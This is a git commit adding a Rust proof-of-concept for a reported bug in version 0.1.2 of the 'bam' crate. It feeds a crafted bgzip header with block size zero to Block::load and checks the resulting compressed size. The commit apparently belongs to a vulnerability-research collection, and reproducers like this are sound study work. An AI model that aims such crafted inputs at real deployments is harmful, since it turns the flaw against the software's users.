3a4762a8986b851cbffff83754a271d67376961d
Yechan Bae <yechan@gatech.edu>
2021-01-28 04:42:50 -0500

    Add bam PoC

--- poc/0097-bam.rs
+++ poc/0097-bam.rs
@@ -4,6 +4,9 @@
 crate = "bam"
 version = "0.1.2"
 
+[test]
+cargo_flags = ["--release"]
+
 [report]
 issue_url = "https://gitlab.com/tprodanov/bam/-/issues/4"
 issue_date = 2021-01-07
@@ -11,10 +14,37 @@ issue_date = 2021-01-07
 [[bugs]]
 analyzer = "UnsafeDataflow"
 bug_class = "UninitExposure"
+
+[[bugs]]
+analyzer = "Manual"
+guide = "UnsafeDataflow"
+bug_class = "Other"
 ```
 !*/
 #![forbid(unsafe_code)]
 
+use bam::bgzip::Block;
+
+pub const MAX_BLOCK_SIZE: usize = 65536;
+
+const HEADER_SIZE: usize = 12;
+const MIN_EXTRA_SIZE: usize = 6;
+const FOOTER_SIZE: usize = 8;
+// WRAPPER_SIZE = 26
+const WRAPPER_SIZE: usize = HEADER_SIZE + MIN_EXTRA_SIZE + FOOTER_SIZE;
+
+pub const MAX_COMPRESSED_SIZE: usize = MAX_BLOCK_SIZE - WRAPPER_SIZE;
+
 fn main() {
-    panic!("This issue was reported without PoC");
+    let mut block = Block::new();
+
+    let mut buf: Vec<u8> = Vec::new();
+    buf.extend(&[31, 139, 8, 4, 5, 6, 7, 8, 9, 10, 0, 0]); // 12 bytes header
+    buf.extend(&[66, 67, 2, 0, 0, 0]); // `block_size` is 0
+
+    block.load(None, &mut buf.as_slice()).ok();
+
+    let compressed_size = block.compressed_size();
+    println!("{}", compressed_size);
+    assert!(compressed_size as usize <= MAX_COMPRESSED_SIZE + FOOTER_SIZE);
 }
